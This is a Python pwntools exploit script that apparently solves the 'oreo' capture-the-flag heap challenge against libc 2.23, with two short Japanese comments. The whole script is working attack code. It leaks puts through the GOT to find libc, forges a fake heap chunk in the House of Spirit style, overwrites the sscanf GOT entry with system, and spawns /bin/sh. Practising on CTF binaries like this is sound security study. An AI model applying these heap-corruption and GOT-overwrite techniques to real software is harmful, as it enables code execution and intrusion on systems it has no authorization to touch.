#!/usr/bin/env python3
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./oreo_patched")
gdb.attach(target, gdbscript="b free")
elf = ELF("oreo_patched")
glibc = ELF("libc-2.23.so")

def clear():
    for i in range(17):
        target.recvline()

def new_rifle(name, description):
    target.sendline("1")
    target.sendline(name)
    target.sendline(description)

def order_rifle():
    target.sendline("3")

def message(content):
    target.sendline("4")
    target.sendline(content)

def leak():
    target.sendline("2")
    for i in range(6):
        target.recvline()

    string = u32(target.recvline()[13:17])
    return string

clear()

fake_chunk = p32(0) * 9 + p32(0x81)
message(fake_chunk)

leak_payload = b"1" * 0x1b + p32(elf.got["puts"])
new_rifle(leak_payload, b"world")

puts_leak = leak()
libc = puts_leak - glibc.symbols["puts"]
system = libc + glibc.symbols["system"]

clear_string = b"1" * 0x1b + p32(0)
new_rifle(clear_string, b"1111")
for i in range(0x3e):
    new_rifle(b"hello", b"world")
    order_rifle()

fake = b"1" * 0x1b + p32(0x804a2a8)
new_rifle(fake, b"first")

order_rifle()

#fgetsした後sscanfに渡しているため
#fgets使うとループするしscanfではなくこっちが使われていることに留意
new_rifle(b"point", p32(elf.got["__isoc99_sscanf"]))

message(p32(system))
target.sendline("/bin/sh")

target.interactive()